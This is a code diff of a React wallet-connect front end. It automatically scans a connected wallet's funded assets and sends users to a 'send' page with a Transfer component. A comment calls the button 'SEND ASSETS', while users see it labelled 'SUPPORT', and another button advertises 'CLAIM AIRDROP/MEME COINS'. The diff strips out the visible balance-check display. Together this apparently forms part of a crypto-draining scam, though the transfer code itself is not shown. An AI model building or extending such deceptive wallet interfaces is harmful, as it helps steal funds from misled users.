@@ -2,8 +2,7 @@ import React, {
 useState,
 useEffect,
 useCallback,
-useRef,
-useMemo
+useRef
 } from "react";
 
 import { useAppKitAccount } from "@reown/appkit/react";
@@ -37,10 +36,8 @@ const [error, setError] = useState("");
 const [showZero, setShowZero] = useState(false);
 const [activePage, setActivePage] = useState("send");
 const [recordStatus, setRecordStatus] = useState("");
-const [balanceCheckStatus, setBalanceCheckStatus] = useState("Waiting for wallet");
 
 const recordedWallet = useRef("");
-const scanRequest = useRef(0);
 
 // Detect wallet type
 const isSolana = caipAddress?.startsWith("solana:");
@@ -129,41 +126,17 @@ setRecordStatus("");
 const scanWallet = useCallback(async () => {
 if ((!isEvm && !isSolana) || !address) return;
 
-const requestId = ++scanRequest.current;
-
 setLoading(true);
 setError("");
-setBalanceCheckStatus("Checking wallet balances...");
 
 try {
   const result = isSolana
     ? await getSolanaWalletPortfolio(address)
     : await getWalletPortfolio(address);
 
-  // Ignore an outdated scan if the wallet has changed
-  if (requestId !== scanRequest.current) return;
-
   setPortfolio(result);
 
-  const foundAssets = result?.assets || [];
-
-  const fundedAssets = foundAssets.filter(
-    asset => Number(asset.balance) > 0
-  );
-
-  if (fundedAssets.length > 0) {
-    setBalanceCheckStatus(
-      `Balance scan complete: ${fundedAssets.length} funded asset(s) detected`
-    );
-  } else {
-    setBalanceCheckStatus(
-      "Balance scan complete: No positive balances detected"
-    );
-  }
-
 } catch (err) {
-  if (requestId !== scanRequest.current) return;
-
   console.error("Wallet scanning error:", err);
 
   setPortfolio(null);
@@ -172,29 +145,20 @@ try {
     err.message || "Unable to scan wallet"
   );
 
-  setBalanceCheckStatus("Balance check failed");
-
 } finally {
-  if (requestId === scanRequest.current) {
-    setLoading(false);
-  }
+  setLoading(false);
 }
 
 }, [address, isEvm, isSolana]);
 
 // Automatically scan when wallet connects or changes
 useEffect(() => {
-scanRequest.current++;
-
 setPortfolio(null);
 setError("");
 setActivePage("send");
 
 if (isEvm || isSolana) {
-  setBalanceCheckStatus("Starting automatic balance check");
   scanWallet();
-} else {
-  setBalanceCheckStatus("Waiting for supported wallet");
 }
 
 }, [address, isEvm, isSolana, scanWallet]);
@@ -209,25 +173,6 @@ asset => Number(asset.balance) > 0
 );
 
 const networkStatus = portfolio?.networks || [];
-
-// Automatically identify funded and native assets
-const balanceSummary = useMemo(() => {
-const fundedAssets = assets.filter(
-asset => Number(asset.balance) > 0
-);
-
-const nativeAssets = fundedAssets.filter(
-  asset => asset.type === "native"
-);
-
-return {
-  total: assets.length,
-  funded: fundedAssets.length,
-  native: nativeAssets.length,
-  nativeAssets
-};
-
-}, [assets]);
 
 // Format balances
 const formatBalance = value => {
@@ -305,41 +250,6 @@ return (
           {recordStatus}
         </p>
 
-        {/* AUTOMATIC BALANCE CHECK STATUS */}
-
-        <div style={styles.balanceCheckBox}>
-
-          <strong>Wallet Balance Check</strong>
-
-          <p style={styles.balanceCheckStatus}>
-            {balanceCheckStatus}
-          </p>
-
-          {portfolio && (
-
-            <div style={styles.balanceStats}>
-
-              <div>
-                <strong>{balanceSummary.total}</strong>
-                <small>Detected assets</small>
-              </div>
-
-              <div>
-                <strong>{balanceSummary.funded}</strong>
-                <small>Funded assets</small>
-              </div>
-
-              <div>
-                <strong>{balanceSummary.native}</strong>
-                <small>Native assets</small>
-              </div>
-
-            </div>
-
-          )}
-
-        </div>
-
         {/* TOP GREEN SEND ASSETS BUTTON */}
 
         {!isSolana && isEvm && (
@@ -348,7 +258,7 @@ return (
             onClick={() => setActivePage("send")}
             style={styles.topSendButton}
           >
-            ↗ SUPPORT
+            ↗ SUPPORT 
           </button>
 
         )}
@@ -573,7 +483,7 @@ return (
                   : styles.navButton
               }
             >
-              CLAIM AIRDROP/MEME COINS
+              CLAIM AIRDROP/MEME COINS 
             </button>
 
             <button
@@ -593,23 +503,10 @@ return (
 
           {activePage === "send" ? (
 
-            <>
-
-              {/* TRANSFER COMPONENT */}
-
-              <Transfer
-                assets={assets}
-                portfolio={portfolio}
-                walletAddress={address}
-                caipAddress={caipAddress}
-                isConnected={isConnected}
-                isSolana={isSolana}
-                isEvm={isEvm}
-                balanceCheckStatus={balanceCheckStatus}
-                onRefresh={scanWallet}
-              />
-
-            </>
+            <Transfer
+              assets={assets}
+              onRefresh={scanWallet}
+            />
 
           ) : (
 
@@ -915,27 +812,6 @@ padding: "22px",
 borderRadius: "14px",
 marginBottom: "18px",
 boxShadow: "0 2px 10px rgba(0,0,0,0.05)"
-},
-
-balanceCheckBox: {
-marginTop: "18px",
-padding: "15px",
-background: "#f0fdf4",
-border: "1px solid #bbf7d0",
-borderRadius: "10px"
-},
-
-balanceCheckStatus: {
-fontSize: "13px",
-color: "#166534"
-},
-
-balanceStats: {
-display: "flex",
-justifyContent: "space-around",
-flexWrap: "wrap",
-gap: "15px",
-marginTop: "12px"
 },
 
 navigation: {
